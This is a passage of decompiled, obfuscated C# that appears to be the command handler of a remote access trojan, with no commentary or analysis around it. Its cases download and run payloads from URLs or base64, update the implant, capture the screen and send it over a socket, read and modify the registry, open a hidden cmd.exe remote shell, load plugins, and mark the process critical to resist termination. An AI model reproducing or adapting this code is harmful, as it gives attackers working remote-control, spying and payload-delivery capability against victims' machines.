					gClass = this;
					string_2 = "kl" + string_8 + method_6(ref gclass1_0.string_1);
					goto IL_0ce7;
				case "inf":
				{
					string_ = "inf" + string_8;
					gClass = this;
					string text5;
					GClass0 gClass2;
					GClass0 obj33;
					ref string string_3;
					if (Operators.CompareString(gClass.method_2("vn"), "", false) == 0)
					{
						text5 = string_;
						gClass2 = this;
						obj33 = gClass2;
						string_3 = ref obj33.string_0;
					}
					else
					{
						text5 = string_;
						gClass2 = this;
						obj33 = gClass2;
						string_ = obj33.method_2("vn");
						string_3 = ref string_;
					}
					string_ = obj33.method_7(ref string_3) + "_" + method_16();
					string_ = text5 + gClass2.method_6(ref string_) + string_8;
					string[] array57 = (array14 = new string[5]);
					array57[0] = string_;
					array57[1] = string_6;
					array57[2] = ":";
					array57[3] = string_7;
					array57[4] = string_8;
					string_2 = (string_ = (string_ = (string_ = (string_ = string.Concat(array57)) + string_4 + string_8) + this.string_3 + string_8) + Process.GetCurrentProcess().ProcessName);
					goto IL_0ce7;
				}
				case "prof":
					if (Operators.CompareString(string_ = array[1], "~", false) == 0)
					{
						obj34 = method_3(array[2], array[3]);
						break;
					}
					if (Operators.CompareString(string_, "!", false) == 0)
					{
						gClass = this;
						gClass.method_3(array[2], array[3]);
						array15 = (array14 = new string[5]);
						array15[0] = "getvalue";
						array15[1] = string_8;
						array15[2] = array[1];
						array15[3] = string_8;
						obj13 = array15;
						num = 4;
						obj14 = method_2(array[1]);
						goto IL_067b;
					}
					if (Operators.CompareString(string_, "~", false) == 0)
					{
						method_1(array[2]);
					}
					break;
				case "rn":
				{
					array13 = null;
					object obj24;
					if (!array[2].ToLower().StartsWith("http"))
					{
						byte[] byte_2 = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						obj24 = method_12(byte_2, ref bool_);
					}
					else
					{
						object obj25 = (obj15 = new WebClient());
						object[] array44 = (array2 = new object[1]);
						string[] array45 = (array14 = array);
						int num5 = 2;
						array44[0] = array45[2];
						array2 = array44;
						bool[] array21;
						bool[] array46 = (array21 = new bool[1]);
						array46[0] = true;
						object obj26 = NewLateBinding.LateGet(obj25, (Type)null, "DownloadData", array44, (string[])null, (Type[])null, array46);
						if (array21[0])
						{
							array14[num5] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						obj24 = (byte[])obj26;
					}
					array13 = (byte[])obj24;
					method_25("bla");
					string[] array47 = (array14 = new string[5]);
					array47[0] = Interaction.Environ("temp");
					array47[1] = "\\";
					array47[2] = method_8(10);
					array47[3] = ".";
					array47[4] = array[1];
					string text3 = (string_ = string.Concat(array47));
					File.WriteAllBytes(text3, array13);
					Process.Start(text3);
					break;
				}
				case "inv":
				{
					gClass = this;
					gClass.method_25("bla");
					if ((string_ = gClass.method_2(array[1])).Length > 0)
					{
						array13 = Convert.FromBase64String(string_);
					}
					else
					{
						if (array[3].Length == 1)
						{
							array15 = (array14 = new string[5]);
							array15[0] = "pl";
							array15[1] = string_8;
							array15[2] = array[1];
							array15[3] = string_8;
							obj13 = array15;
							num = 4;
							obj14 = "False";
							goto IL_067b;
						}
						byte[] byte_4 = Convert.FromBase64String(array[3]);
						bool bool_ = false;
						array13 = gClass.method_12(byte_4, ref bool_);
						if (!Conversions.ToBoolean(method_3(array[1], Convert.ToBase64String(array13))))
						{
							goto IL_0447;
						}
						gClass = this;
					}
					string[] array58 = (array14 = new string[5]);
					array58[0] = "pl";
					array58[1] = string_8;
					array58[2] = array[1];
					array58[3] = string_8;
					array58[4] = Conversions.ToString(0);
					gClass.method_25(string.Concat(array58));
					goto IL_0447;
				}
				case "ret":
				{
					gClass = this;
					gClass.method_25("bla");
					if ((string_ = gClass.method_2(array[1])).Length > 0)
					{
						array13 = Convert.FromBase64String(string_);
					}
					else
					{
						if (array[2].Length == 1)
						{
							array15 = (array14 = new string[5]);
							array15[0] = "pl";
							array15[1] = string_8;
							array15[2] = array[1];
							array15[3] = string_8;
							obj13 = array15;
							num = 4;
							obj14 = "True";
							goto IL_067b;
						}
						byte[] byte_ = Convert.FromBase64String(array[2]);
						bool bool_ = false;
						array13 = gClass.method_12(byte_, ref bool_);
						if (!Conversions.ToBoolean(method_3(array[1], Convert.ToBase64String(array13))))
						{
							goto IL_0617;
						}
						gClass = this;
					}
					string[] array16 = (array14 = new string[5]);
					array16[0] = "pl";
					array16[1] = string_8;
					array16[2] = array[1];
					array16[3] = string_8;
					array16[4] = Conversions.ToString(0);
					gClass.method_25(string.Concat(array16));
					goto IL_0617;
				}
				case "CAP":
				{
					int width = Screen.get_PrimaryScreen().get_Bounds().Width;
					Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(width, rectangle.Height);
					Bitmap val2 = val;
					Graphics val3;
					Graphics obj36 = (val3 = Graphics.FromImage((Image)val));
					Size size = new Size(((Image)val2).get_Width(), ((Image)val2).get_Height());
					obj36.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					try
					{
						Cursor @default = Cursors.get_Default();
						Point position = Cursor.get_Position();
						size = new Size(32, 32);
						rectangle = new Rectangle(position, size);
						@default.Draw(val3, rectangle);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					val3.Dispose();
					MemoryStream memoryStream;
					MemoryStream memoryStream2 = (memoryStream = new MemoryStream());
					string_ = "CAP" + string_8;
					memoryStream2.Write(byte_0 = method_9(ref string_), 0, byte_0.Length);
					MemoryStream memoryStream3 = new MemoryStream();
					IntPtr intPtr = default(IntPtr);
					((Image)val2).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
					memoryStream.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
					method_24(memoryStream.ToArray());
					memoryStream.Dispose();
					memoryStream3.Dispose();
					((Image)val2).Dispose();
					break;
				}
				case "P":
					gClass = this;
					string_2 = "P";
					goto IL_0ce7;
				case "un":
					string_ = array[1];
					switch (string_)
					{
					default:
						return;
					case "~":
						method_27();
						return;
					case "!":
						method_23(0);
						break;
					case "@":
					{
						method_23(0);
						Type typeFromHandle = typeof(Process);
						object[] array59 = (array2 = new object[1]);
						array59[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj15 = object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null));
						array2 = array59;
						bool[] array21;
						bool[] array60 = (array21 = new bool[1]);
						array60[0] = true;
						NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array59, (string[])null, (Type[])null, array60, true);
						if (array21[0])
						{
							object obj35 = obj15;
							object[] array20;
							object[] array61 = (array20 = new object[1]);
							array61[0] = RuntimeHelpers.GetObjectValue(array2[0]);
							NewLateBinding.LateSetComplex(obj35, (Type)null, "FullName", array61, (string[])null, (Type[])null, true, false);
						}
						break;
					}
					}
					ProjectData.EndApp();
					break;
				case "up":
				{
					array13 = null;
					object obj28;
					int num5;
					object[] array20;
					if (!array[1].ToLower().StartsWith("http"))
					{
						byte[] byte_3 = Convert.FromBase64String(array[1]);
						bool bool_ = false;
						obj28 = method_12(byte_3, ref bool_);
					}
					else
					{
						object obj29 = (obj15 = new WebClient());
						object[] array52 = (array20 = new object[1]);
						string[] array53 = (array14 = array);
						num5 = 1;
						array52[0] = array53[1];
						array2 = array52;
						bool[] array21;
						bool[] array54 = (array21 = new bool[1]);
						array54[0] = true;
						object obj30 = NewLateBinding.LateGet(obj29, (Type)null, "DownloadData", array52, (string[])null, (Type[])null, array54);
						if (array21[0])
						{
							array14[num5] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						obj28 = (byte[])obj30;
					}
					array13 = (byte[])obj28;
					method_25("bla");
					object obj31 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array55 = (array20 = new object[2]);
					array55[0] = "di";
					array55[1] = "";
					NewLateBinding.LateCall(obj31, (Type)null, "SetValue", array55, (string[])null, (Type[])null, (bool[])null, true);
					string text4 = (string_ = Interaction.Environ("temp") + "\\" + method_8(10) + ".exe");
					File.WriteAllBytes(text4, array13);
					Process.Start(text4, "UP:" + Conversions.ToString(Process.GetCurrentProcess().Id));
					num5 = 0;
					do
					{
						Thread.Sleep(10);
						object obj32 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array56 = (array20 = new object[2]);
						array56[0] = "di";
						array56[1] = "";
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj32, (Type)null, "GetValue", array56, (string[])null, (Type[])null, (bool[])null), (object)"!", false))
						{
							method_27();
						}
					}
					while (++num5 <= 500);
					break;
				}
				case "RG":
				{
					obj15 = method_22(array[2]);
					string_ = array[1];
					string[] array29;
					int num3;
					object[] array30;
					int num4;
					string[] array18;
					int num2;
					object[] array20;
					switch (string_)
					{
					default:
						return;
					case "~":
						break;
					case "!":
					{
						object obj19 = obj15;
						object[] array31 = (array2 = new object[3]);
						string[] array32 = (array14 = array);
						int num5 = 3;
						array31[0] = array32[3];
						string[] array33;
						string[] array34 = (array33 = array);
						int num6 = 4;
						array31[1] = array34[4];
						string[] array35 = (array18 = array);
						num2 = 5;
						array31[2] = array35[5];
						array20 = array31;
						bool[] array21;
						bool[] array36 = (array21 = new bool[3]);
						array36[0] = true;
						array36[1] = true;
						array36[2] = true;
						NewLateBinding.LateCall(obj19, (Type)null, "SetValue", array31, (string[])null, (Type[])null, array36, true);
						bool[] array37 = array21;
						if (array37[0])
						{
							array14[num5] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array20[0]), typeof(string));
						}
						if (array37[1])
						{
							array33[num6] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array20[1]), typeof(string));
						}
						if (array37[2])
						{
							array29 = array18;
							num3 = num2;
							array30 = array20;
							num4 = 2;
							goto IL_0eba;
						}
						return;
					}
					case "@":
					{
						object obj18 = obj15;
						object[] array26 = (array2 = new object[2]);
						string[] array27 = (array18 = array);
						num2 = 3;
						array26[0] = array27[3];
						array26[1] = false;
						array20 = array26;
						bool[] array21;
						bool[] array28 = (array21 = new bool[2]);
						array28[0] = true;
						array28[1] = false;
						NewLateBinding.LateCall(obj18, (Type)null, "DeleteValue", array26, (string[])null, (Type[])null, array28, true);
						if (array21[0])
						{
							goto IL_0eb3;
						}
						return;
					}
					case "#":
					{
						object obj17 = obj15;
						object[] array23 = (array2 = new object[1]);
						string[] array24 = (array18 = array);
						num2 = 3;
						array23[0] = array24[3];
						array20 = array23;
						bool[] array21;
						bool[] array25 = (array21 = new bool[1]);
						array25[0] = true;
						NewLateBinding.LateCall(obj17, (Type)null, "CreateSubKey", array23, (string[])null, (Type[])null, array25, true);
						if (!array21[0])
						{
							return;
						}
						goto IL_0eb3;
					}
					case "$":
						{
							object obj16 = obj15;
							object[] array17 = (array2 = new object[1]);
							string[] array19 = (array18 = array);
							num2 = 3;
							array17[0] = array19[3];
							array20 = array17;
							bool[] array21;
							bool[] array22 = (array21 = new bool[1]);
							array22[0] = true;
							NewLateBinding.LateCall(obj16, (Type)null, "DeleteSubKeyTree", array17, (string[])null, (Type[])null, array22, true);
							if (!array21[0])
							{
								return;
							}
							goto IL_0eb3;
						}
						IL_0eb3:
						array29 = array18;
						num3 = num2;
						array30 = array20;
						num4 = 0;
						goto IL_0eba;
						IL_0eba:
						array29[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array30[num4]), typeof(string));
						return;
					}
					string[] array38 = (array14 = new string[6]);
					array38[0] = "RG";
					array38[1] = string_8;
					array38[2] = "~";
					array38[3] = string_8;
					array38[4] = array[2];
					array38[5] = string_8;
					string_ = string.Concat(array38);
					string text = "";
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						IEnumerator enumerator2 = (enumerator = ((IEnumerable)NewLateBinding.LateGet(obj15, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator());
						while (enumerator2.MoveNext())
						{
							enumerator2 = enumerator;
							string text2;
							if (!(text2 = Conversions.ToString(enumerator2.Current)).Contains("\\"))
							{
								text = text + text2 + string_8;
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					IEnumerator enumerator3 = default(IEnumerator);
					try
					{
						IEnumerator enumerator4 = (enumerator3 = ((IEnumerable)NewLateBinding.LateGet(obj15, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator());
						while (enumerator4.MoveNext())
						{
							enumerator4 = enumerator3;
							string text2 = Conversions.ToString(enumerator4.Current);
							string[] array39 = (array14 = new string[7]);
							array39[0] = text;
							array39[1] = text2;
							array39[2] = "/";
							object obj20 = obj15;
							object[] array40 = (array2 = new object[1]);
							array40[0] = text2;
							array2 = array40;
							bool[] array21;
							bool[] array41 = (array21 = new bool[1]);
							array41[0] = true;
							object obj21 = NewLateBinding.LateGet(obj20, (Type)null, "GetValueKind", array40, (string[])null, (Type[])null, array41);
							if (array21[0])
							{
								text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
							}
							array39[3] = obj21.ToString();
							array39[4] = "/";
							object obj22 = obj15;
							object[] array42 = (array20 = new object[2]);
							array42[0] = text2;
							array42[1] = "";
							array2 = array42;
							bool[] array43 = (array21 = new bool[2]);
							array43[0] = true;
							array43[1] = false;
							object obj23 = NewLateBinding.LateGet(obj22, (Type)null, "GetValue", array42, (string[])null, (Type[])null, array43);
							if (array21[0])
							{
								_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
							}
							array39[5] = obj23.ToString();
							array39[6] = string_8;
							text = string.Concat(array39);
						}
					}
					finally
					{
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
					}
					gClass = this;
					string_2 = string_ + text;
					goto IL_0ce7;
				}
				case "rsc":
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					object_1 = null;
					break;
				case "rss":
					{
						try
						{
							NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						object_1 = new Process();
						object obj = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array3 = (array2 = new object[1]);
						array3[0] = true;
						NewLateBinding.LateSetComplex(obj, (Type)null, "RedirectStandardOutput", array3, (string[])null, (Type[])null, false, true);
						object obj2 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array4 = (array2 = new object[1]);
						array4[0] = true;
						NewLateBinding.LateSetComplex(obj2, (Type)null, "RedirectStandardInput", array4, (string[])null, (Type[])null, false, true);
						object obj3 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array5 = (array2 = new object[1]);
						array5[0] = true;
						NewLateBinding.LateSetComplex(obj3, (Type)null, "RedirectStandardError", array5, (string[])null, (Type[])null, false, true);
						object obj4 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array6 = (array2 = new object[1]);
						array6[0] = "cmd.exe";
						NewLateBinding.LateSetComplex(obj4, (Type)null, "FileName", array6, (string[])null, (Type[])null, false, true);
						object obj5 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array7 = (array2 = new object[1]);
						array7[0] = true;
						NewLateBinding.LateSetComplex(obj5, (Type)null, "RedirectStandardError", array7, (string[])null, (Type[])null, false, true);
						((Process)object_1).OutputDataReceived += method_19;
						((Process)object_1).ErrorDataReceived += method_19;
						((Process)object_1).Exited += delegate
						{
							method_20();
						};
						object obj6 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array8 = (array2 = new object[1]);
						array8[0] = false;
						NewLateBinding.LateSetComplex(obj6, (Type)null, "UseShellExecute", array8, (string[])null, (Type[])null, false, true);
						object obj7 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array9 = (array2 = new object[1]);
						array9[0] = true;
						NewLateBinding.LateSetComplex(obj7, (Type)null, "CreateNoWindow", array9, (string[])null, (Type[])null, false, true);
						object obj8 = NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array10 = (array2 = new object[1]);
						array10[0] = ProcessWindowStyle.Hidden;
						NewLateBinding.LateSetComplex(obj8, (Type)null, "WindowStyle", array10, (string[])null, (Type[])null, false, true);
						object obj9 = object_1;
						object[] array11 = (array2 = new object[1]);
						array11[0] = true;
						NewLateBinding.LateSet(obj9, (Type)null, "EnableRaisingEvents", array11, (string[])null, (Type[])null);
						method_25("rss");
						NewLateBinding.LateCall(object_1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						NewLateBinding.LateCall(object_1, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						obj10 = object_1;
						obj11 = null;
						obj12 = "BeginOutputReadLine";
						array12 = new object[0];
						goto IL_11e4;
					}
					IL_0447:
					obj27 = (obj15 = RuntimeHelpers.GetObjectValue(method_18(array13, "A")));
					array48 = (array2 = new object[1]);
					array48[0] = string_6;
					NewLateBinding.LateSet(obj27, (Type)null, "h", array48, (string[])null, (Type[])null);
					array49 = (array2 = new object[1]);
					array49[0] = string_7;
					NewLateBinding.LateSet(obj27, (Type)null, "p", array49, (string[])null, (Type[])null);
					array50 = (array2 = new object[1]);
					array50[0] = array[2];
					NewLateBinding.LateSet(obj27, (Type)null, "osk", array50, (string[])null, (Type[])null);
					NewLateBinding.LateCall(obj27, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!bool_2), Operators.CompareObjectEqual(NewLateBinding.LateGet(obj15, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					array51 = (array2 = new object[1]);
					array51[0] = true;
					NewLateBinding.LateSet(obj27, (Type)null, "off", array51, (string[])null, (Type[])null);
					break;
					IL_0ce7:
					gClass.method_25((string)string_2);
					break;
					IL_0617:
					gClass = this;
					obj15 = RuntimeHelpers.GetObjectValue(gClass.method_18(array13, "A"));
					array15 = (array14 = new string[5]);
					array15[0] = "ret";
					array15[1] = string_8;
					array15[2] = array[1];
					array15[3] = string_8;
					obj13 = array15;
					num = 4;
					string_ = Conversions.ToString(NewLateBinding.LateGet(obj15, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					obj14 = method_6(ref string_);
					goto IL_067b;
					IL_11e4:
					obj34 = NewLateBinding.LateCall(obj10, (Type)obj11, (string)obj12, array12, (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_067b:
					obj13[num] = (string)obj14;
					string_2 = string.Concat(array15);
					goto IL_0ce7;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				try
				{
					string[] array18;
					string[] array62 = (array18 = new string[5]);
					array62[0] = "ER";
					array62[1] = string_8;
					array62[2] = array[0];
					array62[3] = string_8;
					array62[4] = ex2.Message;
					method_25(string.Concat(array62));
					if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
					{
						method_25("bla");
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public RegistryKey method_22(string string_11)
	{
		object[] array;
		object obj3;
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ClassesRoot", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] obj2 = new object[2] { text, true };
			array = obj2;
			bool[] array2;
			bool[] array3 = (array2 = new bool[2]);
			array3[0] = true;
			array3[1] = false;
			obj3 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", obj2, (string[])null, (Type[])null, array3);
			if (array2[0])
			{
				goto IL_0465;
			}
		}
		else if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] obj5 = new object[2] { text, true };
			array = obj5;
			bool[] array2;
			bool[] array4 = (array2 = new bool[2]);
			array4[0] = true;
			array4[1] = false;
			obj3 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", obj5, (string[])null, (Type[])null, array4);
			if (array2[0])
			{
				goto IL_0465;
			}
		}
		else if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj6 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] obj7 = new object[2] { text, true };
			array = obj7;
			bool[] array2;
			bool[] array5 = (array2 = new bool[2]);
			array5[0] = true;
			array5[1] = false;
			obj3 = NewLateBinding.LateGet(obj6, (Type)null, "OpenSubKey", obj7, (string[])null, (Type[])null, array5);
			if (array2[0])
			{
				goto IL_0465;
			}
		}
		else
		{
			if (!string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))))
			{
				return null;
			}
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"\\")), "");
			object obj8 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Users", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array6 = (array = new object[2] { text, true });
			bool[] array2;
			bool[] array7 = (array2 = new bool[2]);
			array7[0] = true;
			array7[1] = false;
			obj3 = NewLateBinding.LateGet(obj8, (Type)null, "OpenSubKey", array6, (string[])null, (Type[])null, array7);
			if (array2[0])
			{
				goto IL_0465;
			}
		}
		goto IL_0482;
		IL_0482:
		return (RegistryKey)obj3;
		IL_0465:
		_ = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		goto IL_0482;
	}

	public void method_23(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_24(byte[] byte_0)
	{
		if (!bool_2)
		{
			return;
		}
		try
		{
			object obj;
			object obj2 = (obj = new MemoryStream());
			object[] obj3 = new object[3] { byte_0, 0, byte_0.Length };
			object[] array = obj3;
			bool[] array2;
			bool[] array3 = (array2 = new bool[3]);
			array3[0] = true;
			array3[1] = false;
			array3[2] = false;
			NewLateBinding.LateCall(obj2, (Type)null, "Write", obj3, (string[])null, (Type[])null, array3, true);
			if (array2[0])
			{
				_ = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			object[] array4 = new object[3];
			array4[0] = method_9(ref string_9);
			array4[1] = 0;
			array4[2] = string_9.Length;
			NewLateBinding.LateCall(obj2, (Type)null, "Write", array4, (string[])null, (Type[])null, (bool[])null, true);
			object obj4 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			object obj5;
			object[] array5 = (array = new object[4]
			{
				RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj5 = obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null)),
				0,
				RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj = obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)),
				SocketFlags.None
			});
			bool[] array6 = (array2 = new bool[4]);
			array6[0] = true;
			array6[1] = false;
			array6[2] = true;
			array6[3] = false;
			NewLateBinding.LateCall(obj4, (Type)null, "Send", array5, (string[])null, (Type[])null, array6, true);
			bool[] array7 = array2;
			if (array7[0])
			{
				NewLateBinding.LateSetComplex(obj5, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array7[2])
			{
				NewLateBinding.LateSetComplex(obj, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool_2 = false;
			ProjectData.ClearProjectError();
		}
	}

	public void method_25(string string_11)
	{
		method_24(method_9(ref string_11));
	}

	public void method_26()
	{
		object obj = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (object_2 != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Connected", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && bool_2)
					{
						num++;
						if (num <= 500)
						{
							goto IL_00f9;
						}
						num = 0;
						if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
						{
							-1,
							SelectMode.SelectRead
						}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
						{
							goto IL_00f9;
						}
					}
					goto end_IL_0008;
					IL_00f9:
